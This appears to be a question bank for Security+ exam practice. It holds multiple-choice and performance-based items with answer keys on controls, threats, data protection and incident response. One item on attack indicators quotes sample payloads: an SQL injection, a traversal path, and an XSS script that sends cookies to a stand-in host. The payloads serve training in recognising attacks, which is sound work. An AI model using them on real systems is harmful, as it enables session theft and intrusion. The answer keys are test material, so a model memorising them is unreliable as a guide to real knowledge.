M("5.6","An awareness program is being developed. Which approach is MOST effective?",[
["Role-based, recurring training with short modules and phishing simulations tailored to real threats"],
["A single annual 3-hour lecture for everyone","Infrequent, generic training has limited retention."],
["Emailing the full security policy once at hire","Policy acknowledgment alone does not change behavior."],
["Training only the IT department","All users are targets of social engineering."]],0,
"Effective programs use initial and recurring training, are tailored to roles and current threats, and measure results.");
M("2.5","A help desk receives a report that a new vulnerability affects the TLS library used on 300 servers. Patching will take two weeks. Which immediate mitigation BEST reduces risk in the meantime?",[
["Apply vendor-recommended configuration workarounds and increase monitoring for exploitation attempts"],
["Wait for the patch and do nothing","Compensating actions can reduce risk during the patch window."],
["Disable all logging to improve performance","This reduces visibility."],
["Uninstall TLS from all servers","This would break secure communications."]],0,
"When patches can't be applied immediately, workarounds, configuration changes, segmentation, and monitoring reduce exposure.");
M("3.2","Which TWO factors should a security architect consider MOST when deciding whether an inline security device should fail open or fail closed? (Choose two.)",[
["The availability requirements of the protected service"],
["The sensitivity of the data being protected"],
["Whether the device supports SNMPv3","Monitoring support doesn't determine what happens to traffic on failure."],
["The number of administrators who manage the device","Staffing doesn't dictate whether traffic should pass when the device fails."],
["Whether the device is licensed per user or per appliance","Licensing model is unrelated to failure behavior."]],[0,1],
"The choice balances availability (fail-open) against confidentiality/integrity (fail-closed) based on business requirements.");

// Weekly refresh 2026-10-25
M("1.1","After a laptop disappears from the office overnight, the security team reviews badge-reader logs and camera footage to identify who entered. In this situation, what control type are the logs and footage serving as?",[
["Detective"],
["Preventive","They didn't stop the entry or the theft."],
["Corrective","They don't restore anything or fix the damage."],
["Deterrent","Deterrents discourage an act beforehand; here the records are used to find out what happened."]],0,
"Detective controls identify and record an event during or after it happens, such as logs and camera recordings reviewed after an incident.");
M("1.1","A firewall rule set blocks all inbound internet traffic to a web server except HTTPS on port 443. Which control category and type BEST describe this rule?",[
["Managerial and directive","Managerial controls are policies and plans; this rule is enforced by technology."],
["Technical and preventive"],
["Operational and detective","Operational controls are carried out by people, and blocking traffic is not detecting it."],
["Physical and deterrent","A firewall rule is not a physical barrier and does more than discourage."]],1,
"A firewall rule is a technical control implemented in hardware or software, and blocking traffic before it arrives is preventive.");
M("1.3","An approved change replaces a load balancer. Midway through, the engineer realizes a DNS record that isn't in the change request must also be updated or the site will break. What should the engineer do?",[
["Make the DNS change now and mention it in the closing notes","That's an unauthorized change made outside the approved scope."],
["Pause, follow the backout plan if needed, and get the updated change approved before making the DNS edit"],
["Skip the DNS change and finish the rest of the request","Knowingly leaving the service broken isn't acceptable either."],
["Restore the whole environment from last week's backups","That's far more disruptive than needed and loses recent data."]],1,
"Only approved changes should be made. When the scope grows, stop, stay within the backout plan, and get the change request updated and approved.");
M("2.1","A manufacturer secretly pays an outside group to break into a rival's network and copy its unreleased product designs. What is the MOST likely motivation behind the attack?",[
["Service disruption","The goal is to steal information, not knock systems offline."],
["Ethical hacking","Ethical hackers are authorized and report flaws; this is covert theft."],
["Espionage"],
["Revenge","There's no personal grievance; the goal is a competitive advantage."]],2,
"Espionage is the covert theft of secrets, such as designs or plans, to gain a competitive or strategic advantage.");
M("2.1","A threat assessment describes an actor who already has building access and knows the internal systems, but has limited technical skill and no outside funding. Which threat actor type BEST fits?",[
["Nation-state","Nation-states are external, highly funded, and highly sophisticated."],
["Organized crime","Organized crime groups are external and usually well funded."],
["Hacktivist","Hacktivists are external actors driven by a cause."],
["Insider threat"]],3,
"Insider threats come from inside the organization; their advantage is trusted access and knowledge, not funding or advanced skill.");
M("2.2","Before calling the help desk, an attacker researches an employee's name, manager, and current client project so the story \"I'm locked out right before the client demo\" sounds believable. Which technique is the attacker using?",[
["Pretexting"],
["Watering hole","Watering hole attacks compromise a website the targets visit."],
["Typosquatting","Typosquatting uses look-alike domain names."],
["Smishing","Smishing is phishing over SMS text messages."]],0,
"Pretexting is building a believable invented scenario, often backed by research, to persuade a target to hand over access or information.");
M("2.3","An attacker with a foothold on a server writes malicious code into the memory of a legitimate running process so it runs under that process's identity without ever saving a file to disk. Which vulnerability type is being exploited?",[
["Side loading","Side loading is installing apps from outside the official store."],
["Race condition","A race condition abuses the timing between a check and a use."],
["Memory injection"],
["Buffer overflow","A buffer overflow comes from oversized input overwriting adjacent memory, not from inserting code into another process."]],2,
"Memory injection places malicious code inside a trusted process's memory. It's fileless, which helps it evade antivirus tools that scan files.");
M("2.5","A web server has been compromised. The team wants to keep it running so they can watch the attacker, but stop it from reaching any other internal host. Which mitigation BEST fits?",[
["Decommissioning","Decommissioning retires the system, so it couldn't be observed."],
["Isolation"],
["Patching","Patching doesn't remove an attacker who is already inside."],
["Least privilege","Least privilege limits account rights, not where the server can connect."]],1,
"Isolation cuts a system off from other resources, such as moving it to a quarantine network, while it keeps running.");
M("2.5","Before connecting 40 new IP cameras, an administrator changes each camera's factory admin password, disables Telnet, and turns off unused features. Which mitigation technique is this?",[
["Segmentation","Segmentation separates networks; these changes are made on each device."],
["Encryption","None of these steps encrypts data."],
["Decommissioning","The cameras are being deployed, not retired."],
["Hardening"]],3,
"Hardening reduces a device's attack surface by changing default passwords, disabling insecure protocols like Telnet, and removing unneeded features.");
M("3.1","A company runs its customer portal in a public cloud but keeps its payroll database in its own data center, with the two connected over a site-to-site VPN. Which deployment model is this?",[
["Hybrid cloud"],
["Community cloud","A community cloud is shared by several organizations with common needs."],
["Private cloud","Part of this workload runs in a public cloud."],
["Public cloud only","The payroll database stays on premises."]],0,
"A hybrid cloud combines on-premises or private infrastructure with public cloud services that work together.");
M("3.1","A retailer gives every store its own firewall and authentication server instead of routing everything through headquarters, so one site's outage doesn't affect the others. What is a security DRAWBACK of this decentralized design?",[
["It creates a single point of failure at headquarters","That's a risk of a centralized design."],
["It prevents the use of encryption between stores","Decentralized sites can still encrypt their links."],
["It's harder to keep security policies and configurations consistent across every site"],
["It removes the need for central monitoring","Distributed sites still need monitoring, often more of it."]],2,
"Decentralized designs improve resilience but spread out management, which makes consistent configuration, patching, and oversight harder.");
M("3.3","A payment processor replaces the card numbers in its order database with random values that can be mapped back to the real numbers only through a separate, tightly controlled vault. Which data protection method is this?",[
["Hashing","Hashing is one-way, so it can't be mapped back to the original."],
["Masking","Masking hides part of a value, usually when it's displayed."],
["Tokenization"],
["Obfuscation","Obfuscation makes data harder to read but doesn't use a mapping vault."]],2,
"Tokenization swaps sensitive data for random tokens with no mathematical link to the original; only the token vault can map them back.");
M("3.3","A company moves all payment card data onto a dedicated database server in its own network segment, separate from general business data, to shrink the scope of its PCI DSS assessment. Which data protection method is this?",[
["Segmentation"],
["Data masking","Masking hides data on display; it doesn't separate where data lives."],
["Geographic restriction","Geographic restrictions limit access by location."],
["Obfuscation","Obfuscation hides meaning; it doesn't isolate systems."]],0,
"Segmentation keeps sensitive data in a separate, tightly controlled area, which limits exposure and reduces which systems an audit must cover.");
M("3.4","A database server keeps a sequential log of every transaction. After restoring last night's backup, the team replays the log to recover changes up to just before the failure. Which technique makes this possible?",[
["Snapshot","A snapshot captures one point in time, not every change after it."],
["Replication","Replication copies data to another system live, but it doesn't keep a replayable history and copies corruption too."],
["Differential backup","A differential captures changes since the last full backup only when it runs."],
["Journaling"]],3,
"Journaling records each change as it happens, so data can be rebuilt to nearly the moment before an outage.");
M("4.2","A company tags every server in its CMDB as critical, important, or standard based on business impact, so patching and monitoring priorities follow those tags. Which asset management practice is this?",[
["Asset classification"],
["Enumeration","Enumeration discovers which assets exist."],
["Certification","Certification documents that media was properly destroyed."],
["Data retention","Retention governs how long data is kept."]],0,
"Classifying assets by importance or sensitivity tells the team which systems get the strongest protection and fastest attention.");
M("4.3","A critical vulnerability can't be patched because the vendor's fix breaks a key application. Management formally approves leaving it unpatched for 90 days, with compensating controls and a review date. What is this called?",[
["A false positive","The vulnerability is real."],
["Risk transference","Transference shifts risk to a third party, such as an insurer."],
["A vulnerability exception"],
["A rescan","Rescanning validates a fix; nothing has been fixed yet."]],2,
"An exception (or exemption) is a documented, approved decision not to remediate for a set time, usually with compensating controls and a review date.");
M("4.4","A SIEM sees three failed VPN logins followed by a successful login from a new country, all for the same user within five minutes, and raises one high-priority alert. Which capability is this?",[
["Archiving","Archiving stores old logs for long-term retention."],
["Packet capture","Packet capture records raw traffic; it doesn't link events from different sources."],
["Event correlation"],
["SNMP traps","SNMP traps are alerts sent by network devices."]],2,
"Correlation links related events from multiple log sources into a single meaningful alert that no single log entry would trigger.");
M("4.7","A three-person SOC uses playbooks that automatically enrich alerts with threat intelligence and close obvious false positives, letting it handle the alert volume of a much larger team. Which benefit of automation is this?",[
["Guard rails","Guard rails stop insecure configurations from being created."],
["Workforce multiplier"],
["Technical debt","Technical debt is a drawback of automation, not a benefit."],
["Single point of failure","That's a risk of automation, not a benefit."]],1,
"Automation acts as a workforce multiplier: repetitive work is handled automatically, so a small team covers far more.");
M("4.8","A company receives a court order to produce every document related to a contract dispute. The legal team uses a tool to search, collect, and review the relevant electronic records. What is this process?",[
["Legal hold","A legal hold preserves records; it doesn't search for and produce them."],
["Chain of custody","Chain of custody tracks who handled evidence."],
["E-discovery"],
["Threat hunting","Threat hunting searches for attackers, not legal records."]],2,
"Electronic discovery (e-discovery) is identifying, collecting, and producing electronically stored information for legal proceedings.");
M("4.9","An analyst suspects DNS tunneling and wants records of which internal hosts queried long, random-looking subdomains of a single external domain. Which data source is BEST?",[
["Firewall logs","Firewall logs show connections, not the names that were queried."],
["Endpoint antivirus logs","Antivirus logs show detections, not DNS lookups."],
["File metadata","Metadata describes files, not network queries."],
["DNS server query logs"]],3,
"DNS query logs show each requested name and which host asked, which exposes tunneling patterns like unusual subdomain lengths and volume.");
M("5.1","A company document recommends, but doesn't require, that employees use the approved password manager. Which type of governance document is this?",[
["Standard","Standards are mandatory."],
["Procedure","Procedures give step-by-step instructions."],
["Policy","Policies are high-level, mandatory statements."],
["Guideline"]],3,
"Guidelines are recommended practices that give flexibility; policies, standards, and procedures must be followed.");
M("5.3","Before onboarding a small vendor that has no independent audit report, a company sends it a list of detailed questions about its encryption, access control, and incident response practices. What is the company using?",[
["A right-to-audit clause","That's a contract term allowing a later audit, not a set of questions."],
["A vendor questionnaire"],
["A service level agreement","An SLA defines performance targets."],
["A memorandum of understanding","An MOU is a non-binding statement of intent."]],1,
"A vendor questionnaire collects self-reported information about a supplier's security practices during vendor assessment.");
M("5.4","Under GDPR, an online retailer decides why and how its customers' personal data is collected and used. Which role does the retailer hold?",[
["Data processor","A processor handles data only on the controller's instructions."],
["Data subject","The customers are the data subjects."],
["Data controller"],
["Data custodian","A custodian maintains and protects data day to day."]],2,
"The data controller determines the purposes and means of processing personal data and is accountable for protecting it.");
M("5.5","A penetration tester receives only a list of target IP ranges and one standard user account, with no network diagrams or source code. What type of test environment is this?",[
["Known environment","A known environment includes full documentation and access."],
["Partially known environment"],
["Unknown environment","In an unknown environment the tester gets no information at all."],
["Passive reconnaissance","Passive recon is an information-gathering phase, not an environment type."]],1,
"A partially known environment (gray box) gives the tester some information, such as scope or credentials, but not full documentation.");
M("5.6","An employee posts a photo of her new desk online. The whiteboard behind her shows an unreleased project's code name and a sketch of the server room layout. Which security awareness topic does this BEST illustrate?",[
["Removable media","No storage device is involved."],
["Phishing","Nobody sent a deceptive message."],
["Operational security"],
["Password management","No password was exposed."]],2,
"Operational security means not leaking sensitive details through everyday actions, such as photos, posts, or conversations.");

P({id:"pbq-mitigate",obj:"2.5",type:"match",title:"Match the fix to the finding",
prompt:"Match each security finding to the BEST mitigation. Each mitigation is used once.",
items:[
{label:"Login form returns every user when given ' OR 1=1 --",ans:"Parameterized queries",why:"Prepared statements keep user input from being run as SQL."},
{label:"Web server still accepts TLS 1.0 and RC4 ciphers",ans:"Disable legacy protocols and ciphers",why:"Only modern TLS versions and strong ciphers should be allowed."},
{label:"New switch still uses the factory admin password",ans:"Change default credentials",why:"Default passwords are published and easy to guess."},
{label:"Unsupported OS must stay online for six months for a legacy app",ans:"Isolate it on a restricted segment",why:"If it can't be patched, limit what it can reach and who can reach it."},
{label:"Unknown executables keep appearing on lobby kiosks",ans:"Application allow list",why:"Only approved programs are allowed to run."},
{label:"Vendor releases a fix for a remote code execution flaw in the mail server",ans:"Apply the vendor patch",why:"When a fix exists, patching removes the vulnerability."}],
pool:["Parameterized queries","Disable legacy protocols and ciphers","Change default credentials","Isolate it on a restricted segment","Application allow list","Apply the vendor patch","Data masking","Full-disk encryption"],
explain:"Pick the control that removes or contains the specific weakness. Data masking hides values on screen, and full-disk encryption protects data at rest; neither fixes these findings."});

P({id:"pbq-agreements",obj:"5.3",type:"match",title:"Pick the right agreement",
prompt:"Match each requirement to the agreement type that BEST covers it. Each agreement is used once.",
items:[
{label:"99.95% uptime, with service credits if the provider misses it",ans:"SLA",why:"A service level agreement sets measurable performance targets and penalties."},
{label:"A consultant must keep the merger details confidential",ans:"NDA",why:"A non-disclosure agreement legally protects confidential information."},
{label:"Two universities state a non-binding intent to share research",ans:"MOU",why:"A memorandum of understanding records intent without binding terms."},
{label:"Deliverables, timeline, and cost for one project under an existing contract",ans:"SOW",why:"A statement of work defines one specific engagement."},
{label:"Overarching terms that govern all future projects between two firms",ans:"MSA",why:"A master service agreement sets the general terms that each SOW falls under."},
{label:"Joint venture partners define profit sharing and each side's responsibilities",ans:"BPA",why:"A business partners agreement covers how partners share profits, losses, and duties."}],
pool:["SLA","NDA","MOU","SOW","MSA","BPA","Rules of engagement"],
explain:"Know what each agreement is for: performance (SLA), secrecy (NDA), intent (MOU), one project (SOW), umbrella terms (MSA), partnership (BPA). Rules of engagement define the scope of a penetration test."});

// Weekly refresh 2026-11-01
M("1.1","Ransomware encrypts a department's file server. The next morning, the IT team wipes the server and restores the files from the previous night's backup. What control type is the backup restore serving as?",[
["Corrective"],
["Preventive","The restore happens after the attack, so it didn't stop it."],
["Detective","Restoring files doesn't identify or record the attack."],
["Deterrent","A restore doesn't discourage an attacker beforehand."]],0,
"Corrective controls fix or limit the damage after an incident, such as restoring data from backups or reimaging a system.");
M("1.2","A company's VPN server records each user's login time, session length, source IP address, and amount of data transferred. Which part of the AAA framework does this provide?",[
["Authentication","Authentication proves who the user is before the session starts."],
["Authorization","Authorization decides what the user is allowed to reach."],
["Accounting"],
["Attestation","Attestation is formal confirmation of a fact, such as an audit result, not session tracking."]],2,
"Accounting in Authentication, Authorization, and Accounting (AAA) records what users did and when, giving an audit trail of their sessions.");
M("1.3","Before approving a firewall replacement, the change advisory board asks the engineer to list which applications depend on the current rules and what could break during the cutover. What is the board asking for?",[
["A backout plan","A backout plan explains how to undo the change, not what it affects."],
["A maintenance window","That's the scheduled time for the work."],
["An impact analysis"],
["A standard operating procedure","An SOP is a routine set of steps, not a review of one change's effects."]],2,
"An impact analysis identifies which systems, dependencies, and users a change could affect so risks are understood before approval.");
M("2.1","Without asking IT, a marketing manager signs up for a free online file-sharing service and uploads customer lists to share with an outside agency. Which threat actor type BEST describes this?",[
["Hacktivist","Hacktivists attack to promote a cause."],
["Shadow IT"],
["Nation-state","Nation-states are highly funded government-backed attackers."],
["Unskilled attacker","Unskilled attackers run ready-made tools against targets; this employee isn't attacking anyone."]],1,
"Shadow IT is technology used without the IT department's approval. It's usually well-meaning, but it puts data outside the organization's security controls.");
M("2.1","Someone with no programming knowledge downloads a ready-made exploit tool from a forum and runs it against random internet-facing servers to see what happens. Which threat actor type BEST fits?",[
["Unskilled attacker"],
["Advanced persistent threat (APT)","APTs are skilled, well funded, and stay hidden in specific targets for long periods."],
["Organized crime","Organized crime groups are well funded and financially motivated."],
["Insider threat","This person has no inside access to the targets."]],0,
"An unskilled attacker relies on tools and scripts written by others, has limited resources, and often attacks opportunistically rather than with a plan.");
M("2.2","Attackers break into a managed service provider's remote monitoring platform and use it to push ransomware to dozens of the provider's client networks at once. Which threat vector does this BEST describe?",[
["Watering hole","A watering hole compromises a website the targets visit."],
["Default credentials","Nothing indicates an unchanged factory password."],
["Supply chain"],
["Open service ports","The attack came through a trusted provider's tool, not an exposed port."]],2,
"A supply chain attack compromises a trusted third party, such as a managed service provider (MSP) or vendor, to reach that party's customers.");
M("2.3","A storage bucket holding scanned customer contracts was left set to allow public read access, and a researcher finds it with a simple search tool. Which vulnerability type is this?",[
["Zero-day","A zero-day is a flaw unknown to the vendor; this is a settings mistake."],
["Misconfiguration"],
["Firmware vulnerability","No device firmware is involved."],
["Structured Query Language (SQL) injection","No malicious input was sent to a database."]],1,
"Misconfiguration means a system is set up insecurely, such as cloud storage exposed to the public. It's one of the most common causes of cloud data leaks.");
M("2.5","An audit finds that contractor accounts can open every file share on the network, including HR and finance, even though contractors only need their project folder. Which mitigation BEST addresses this?",[
["Least privilege"],
["Encryption","Encryption protects data from outsiders but doesn't limit what an authorized account can open."],
["Isolation","Isolation cuts a system off from the network; the problem is account rights."],
["Patching","No software flaw is involved."]],0,
"Least privilege gives each account only the access it needs for its job, which limits damage if the account is misused or compromised.");
M("3.1","A cloud team now defines its networks, firewall rules, and virtual machines in version-controlled template files and deploys every environment from them. Which is the BEST security benefit?",[
["It removes the need for access controls in the cloud","Access controls are still required."],
["Configurations are consistent and can be reviewed before deployment, which reduces drift and mistakes"],
["It encrypts all data stored in the cloud","Templates define infrastructure; they don't encrypt data by themselves."],
["It moves all security responsibility to the cloud provider","The shared responsibility model still applies."]],1,
"Infrastructure as Code (IaC) builds environments from reviewed, repeatable templates, so every deployment matches the approved secure configuration.");
M("3.2","A company with mostly remote staff wants users' traffic to pass through cloud-delivered security services, including a secure web gateway and zero trust access, close to each user instead of routing everything back to headquarters. Which solution BEST fits?",[
["Jump server","A jump server is a hardened host for reaching admin systems."],
["Screened subnet","A screened subnet hosts public-facing servers at the perimeter."],
["Secure access service edge (SASE)"],
["Software-defined wide area network (SD-WAN)","SD-WAN routes traffic between sites efficiently but doesn't provide the bundled cloud security services by itself."]],2,
"SASE combines networking and cloud-delivered security services, such as a secure web gateway, a Cloud Access Security Broker (CASB), and Zero Trust Network Access (ZTNA), close to the user.");
M("3.3","A payment application decrypts a card number in the server's memory just long enough to send it for approval. Which data state is the card number in at that moment?",[
["Data at rest","Data at rest is stored on disk or other media."],
["Data in transit","Data in transit is moving across a network."],
["Data in use"],
["Data sovereignty","Sovereignty is about which country's laws apply, not a data state."]],2,
"Data in use is being actively processed in memory or by the CPU, which is why it is often in decrypted form and needs protections like memory isolation.");
M("3.3","A company configures its cloud admin console to reject sign-in attempts from any IP address outside the countries where it has offices. Which data protection method is this?",[
["Tokenization","Tokenization replaces sensitive values with tokens."],
["Hashing","Hashing creates a one-way digest of data."],
["Data masking","Masking hides part of a value on display."],
["Geographic restrictions"]],3,
"Geographic restrictions limit access based on location, such as blocking connections from IP address ranges in countries where the company doesn't operate.");
M("3.4","Each year, the disaster recovery team actually moves production systems to the backup site and runs the business from there for a full day. Which type of test is this?",[
["Tabletop exercise","A tabletop is a discussion of a scenario, with no systems moved."],
["Failover"],
["Simulation","A simulation practices a scenario without actually switching production."],
["Parallel processing","Parallel processing runs the backup systems alongside production without cutting over."]],1,
"A failover test actually switches operations to the backup systems, which proves they work but carries the most risk of disruption.");
M("4.2","A company's purchasing policy now requires the security team to review any new hardware or software before a purchase order is approved. Which asset management stage does this control?",[
["Acquisition and procurement"],
["Decommissioning","Decommissioning is retiring assets at the end of their life."],
["Data retention","Retention governs how long data is kept."],
["Enumeration","Enumeration discovers assets that already exist."]],0,
"Building security into acquisition and procurement makes sure new assets meet requirements before they ever join the network.");
M("4.2","Every week, an administrator runs a discovery scan to find devices on the network that are missing from the asset inventory. Which asset management activity is this?",[
["Certification","Certification documents that media was destroyed."],
["Enumeration"],
["Sanitization","Sanitization removes data from media before disposal."],
["Classification","Classification ranks assets by sensitivity or importance."]],1,
"Enumeration identifies and lists every asset that exists, which helps catch unknown or unmanaged devices so they can be tracked and secured.");
M("4.4","Analysts have started ignoring a SIEM rule that fires 500 times a day, almost all of them false positives. The team raises its threshold and excludes known-good backup servers. What is this activity called?",[
["Archiving","Archiving stores logs for long-term retention."],
["Log aggregation","Aggregation collects logs into one place."],
["Quarantine","Quarantine isolates a suspicious file or host."],
["Alert tuning"]],3,
"Alert tuning adjusts rules and thresholds in a Security Information and Event Management (SIEM) system to cut false positives so real alerts aren't missed.");
M("4.7","To finish quickly, a team hard-coded server names into its automation scripts and skipped documentation. Now nearly every infrastructure change breaks the scripts and needs rework. Which automation concern does this BEST describe?",[
["Workforce multiplier","That's a benefit of automation."],
["Technical debt"],
["Guard rails","Guard rails are a benefit that blocks insecure changes."],
["Enforcing baselines","Enforcing baselines is a benefit of automation."]],1,
"Technical debt is the future cost of shortcuts taken now. Automation built on quick fixes becomes fragile and expensive to support.");
M("4.7","When HR marks an employee as terminated, a script immediately disables their accounts, revokes their VPN certificate, and deactivates their badge. Which is the BEST security benefit of automating this?",[
["Access is removed quickly and consistently, with no forgotten steps"],
["It removes the need for periodic access reviews","Access reviews are still needed to catch other problems."],
["It eliminates single points of failure","The script itself could become one."],
["It reduces the cost of the HR system","Cost isn't the security benefit here."]],0,
"Automating deprovisioning shrinks reaction time and applies the same steps every time, so former employees don't keep access by mistake.");
M("4.9","While investigating a breached web server, an analyst wants to know whether the server had known unpatched flaws in the weeks before the attack. Which data source is BEST?",[
["Packet captures","Packet captures show traffic, not missing patches."],
["Vulnerability scan reports"],
["Firewall logs","Firewall logs show allowed and blocked connections."],
["DNS query logs","DNS logs show which names were looked up."]],1,
"Vulnerability scan reports list the known weaknesses found on each system at scan time, showing what an attacker could have exploited.");
M("4.9","An auditor wants to know which user account changed a vendor's bank account details inside the company's accounting software, and exactly when. Which data source is BEST?",[
["Application logs"],
["Network flow data","Flow data shows which hosts talked and how much, not what a user changed in an app."],
["Firewall logs","Firewall logs don't record actions taken inside an application."],
["Operating system security logs","These show logins to the server, not changes to a record inside the application."]],0,
"Application logs record events inside the application itself, such as which user changed which record and when.");
M("5.3","Before buying network switches, a company checks where the components are manufactured, how they're shipped, and whether the vendor's own suppliers have had tampering incidents. What is this?",[
["Rules of engagement","Rules of engagement define a penetration test's scope."],
["A service level agreement","An SLA sets performance targets."],
["Supply chain analysis"],
["A work order","A work order authorizes a specific task."]],2,
"Supply chain analysis examines a vendor's suppliers, manufacturing, and delivery to find risks like counterfeit or tampered components.");
M("5.4","Before acquiring a smaller company, the buyer investigates the target's security controls, past breaches, and regulatory compliance. Which concept is this?",[
["Due care","Due care is the ongoing effort to keep protections in place."],
["Due diligence"],
["Attestation","Attestation is a formal statement confirming compliance."],
["Sanctions","Sanctions are penalties for non-compliance."]],1,
"Due diligence is researching and understanding risks before making a decision, such as an acquisition or signing with a vendor.");
M("5.4","A compliance team uses a tool that continuously checks cloud settings against required controls and reports any drift without anyone running a manual review. Which compliance monitoring approach is this?",[
["External attestation","External attestation is an outside party formally confirming compliance."],
["Legal hold","A legal hold preserves records for litigation."],
["Automation"],
["Data inventory","A data inventory records what data is held and where."]],2,
"Automated compliance monitoring checks controls continuously and flags problems right away, instead of waiting for a periodic manual audit.");
M("5.5","A company hires testers to tailgate employees through secure doors, try to pick locks, and see whether they can reach the server room. What type of test is this?",[
["Passive reconnaissance","Passive recon gathers public information without touching the target."],
["Physical penetration testing"],
["Defensive penetration testing","Defensive testing focuses on detecting and responding to attacks."],
["Known environment test","That describes how much information testers get, not what they test."]],1,
"Physical penetration testing checks facility controls, such as doors, locks, badges, and staff awareness, by trying to break in.");
M("5.6","An employee accidentally emails a spreadsheet of customer Social Security numbers to the wrong outside address because of autocomplete. Which type of anomalous behavior is this?",[
["Risky","Risky behavior is a deliberate choice that ignores security, like disabling antivirus."],
["Unexpected","Unexpected behavior is out of character, like logging in from an unusual country."],
["Unintentional"],
["Malicious insider","Nothing suggests the employee meant to cause harm."]],2,
"Unintentional behavior is an honest mistake, like sending data to the wrong person. Training teaches staff to spot and report these quickly.");

P({id:"pbq-asset-life",obj:"4.2",type:"order",title:"Asset lifecycle",
prompt:"A company buys a new database server. Put the asset management steps in the correct order, from purchase to disposal.",
items:["Security review during procurement","Assign an owner and classify the asset","Add to inventory and monitor it","Decommission it from production","Sanitize the storage media","Obtain a certificate of destruction"],
explain:"Assets move from procurement to assignment (owner and classification) to tracking (inventory and monitoring) to disposal. Take it out of service, sanitize the data, then document destruction with a certificate."});

P({id:"pbq-anomaly",obj:"5.6",type:"bins",title:"Spot the anomalous behavior",
prompt:"Sort each behavior into the type of anomalous behavior it BEST represents.",
bins:["Risky","Unexpected","Unintentional"],
items:[
{label:"Employee disables endpoint protection to speed up a software install",ans:0,why:"A deliberate choice that bypasses a security control."},
{label:"User signs in from two different countries within one hour",ans:1,why:"Out-of-pattern activity that could mean a stolen account."},
{label:"Staffer sends the payroll file to the wrong customer by mistake",ans:2,why:"An honest mistake with no intent."},
{label:"Admin shares their password with a coworker to cover a shift",ans:0,why:"Knowingly breaks policy and weakens accountability."},
{label:"An accountant's account opens engineering source code at 3 a.m.",ans:1,why:"Activity far outside the user's normal role and hours."},
{label:"New hire clicks Reply All and sends a confidential attachment to an outside mailing list",ans:2,why:"An accidental disclosure."}],
explain:"Risky behavior is knowingly unsafe. Unexpected behavior is out of character and may point to a compromised account. Unintentional behavior is an honest mistake. All three should be reported."});

// Performance-based questions
P({id:"pbq-attacks",obj:"2.4",type:"match",title:"Match the attack to the indicator",
prompt:"Match each observed indicator to the attack it MOST likely represents. Each attack is used once.",
items:[
{label:"One login attempt each against 2,500 accounts using 'Spring2026!'",ans:"Password spraying",why:"One common password tried across many accounts is spraying."},
{label:"Web log: GET /view?page=../../../../windows/win.ini",ans:"Directory traversal",why:"../ sequences try to escape the web root."},
{label:"Search box input: ' UNION SELECT username,password FROM users--",ans:"SQL injection",why:"SQL syntax injected into input."},
{label:"Forum post contains <script>fetch('//evil.tld/?c='+document.cookie)<\/script>",ans:"Cross-site scripting",why:"Script stored in a page runs in viewers' browsers."},
{label:"Gateway MAC address in host ARP tables changes to an unknown workstation's MAC",ans:"ARP poisoning (on-path)",why:"Forged ARP replies redirect traffic through the attacker."},
{label:"Victim receives huge volumes of DNS responses it never requested from thousands of open resolvers",ans:"Reflected/amplified DDoS",why:"Spoofed small queries produce large responses aimed at the victim."}],
pool:["Password spraying","Directory traversal","SQL injection","Cross-site scripting","ARP poisoning (on-path)","Reflected/amplified DDoS","Brute force","Replay attack"],
explain:"Recognizing attack indicators in logs is core to objective 2.4. Note the two unused distractors: brute force targets one account with many passwords; replay re-sends captured authentication data."});

P({id:"pbq-ir-order",obj:"4.8",type:"order",title:"Incident response process",
prompt:"Place the phases of the incident response process in the correct order.",
items:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Lessons learned"],
explain:"CompTIA SY0-701 lists: Preparation → Detection → Analysis → Containment → Eradication → Recovery → Lessons learned. Containment always comes before eradication to stop the spread first."});

P({id:"pbq-volatility",obj:"4.8",type:"order",title:"Order of volatility",
prompt:"A forensic analyst is collecting evidence from a compromised, running server. Order the sources from MOST volatile (collect first) to LEAST volatile.",
items:["CPU registers and cache","RAM (system memory)","Swap/page file and temporary files","Local hard drive","Remote logging data","Archived backup tapes"],
explain:"Collect the most volatile evidence first (RFC 3227): registers/cache → memory → temporary/swap → disk → remote logs → archival media."});

P({id:"pbq-firewall",obj:"4.5",type:"table",title:"Configure the perimeter firewall",
prompt:"A company hosts a public HTTPS web server (10.0.5.10) in its screened subnet. Internal users (10.0.1.0/24) must browse the web securely, and the admin jump box (10.0.1.50) must manage the web server via SSH. All other traffic should be blocked. Configure each rule. Rules are processed top-down.",
exhibit:"Zones: INTERNET | DMZ 10.0.5.0/24 | LAN 10.0.1.0/24",
cols:["Port","Action"],
rows:[
{label:"1. ANY (Internet) → 10.0.5.10 (web)",cells:[{opts:["TCP 443","TCP 80","TCP 22","TCP 3389"],ans:0},{opts:["Allow","Deny"],ans:0}]},
{label:"2. 10.0.1.50 (jump box) → 10.0.5.10",cells:[{opts:["TCP 22","TCP 23","TCP 3389","UDP 161"],ans:0},{opts:["Allow","Deny"],ans:0}]},
{label:"3. 10.0.1.0/24 → ANY (Internet)",cells:[{opts:["TCP 443","TCP 21","TCP 23","TCP 445"],ans:0},{opts:["Allow","Deny"],ans:0}]},
{label:"4. ANY (Internet) → 10.0.1.0/24",cells:[{opts:["ANY","TCP 443","TCP 22","TCP 3389"],ans:0},{opts:["Allow","Deny"],ans:1}]},
{label:"5. ANY → ANY (final rule)",cells:[{opts:["ANY","TCP 443","TCP 80","UDP 53"],ans:0},{opts:["Allow","Deny"],ans:1}]}],
explain:"Allow only what is required: HTTPS (443) inbound to the DMZ web server, SSH (22) from the jump box only, HTTPS outbound for users, block unsolicited inbound to the LAN, and end with an implicit/explicit deny-all. Telnet (23), FTP (21), and SMB (445) are insecure or unnecessary here."});

P({id:"pbq-zones",obj:"3.2",type:"bins",layout:"diagram",title:"Place the devices in the network",
prompt:"Place each device or service in the MOST appropriate network zone.",
bins:["Internet edge","Screened subnet (DMZ)","Internal LAN","Restricted data center"],
items:[
{label:"Public-facing web server",ans:1,why:"Internet-facing services belong in the DMZ."},
{label:"Reverse proxy / WAF for public site",ans:1,why:"Inspects inbound web traffic before it reaches internal systems; placed in the DMZ with the public services."},
{label:"Perimeter NGFW",ans:0,why:"The perimeter firewall sits at the internet edge."},
{label:"Employee workstations",ans:2,why:"User endpoints belong on the internal LAN."},
{label:"Customer database server",ans:3,why:"Sensitive data stores belong in the most restricted zone, never the DMZ."},
{label:"Network printers",ans:2,why:"Internal shared devices live on the LAN (ideally their own VLAN)."},
{label:"Public SMTP mail relay",ans:1,why:"Inbound mail relays accept internet connections and belong in the DMZ."},
{label:"Active Directory domain controller",ans:3,why:"Domain controllers are tier-0 assets and belong in a protected server zone."}],
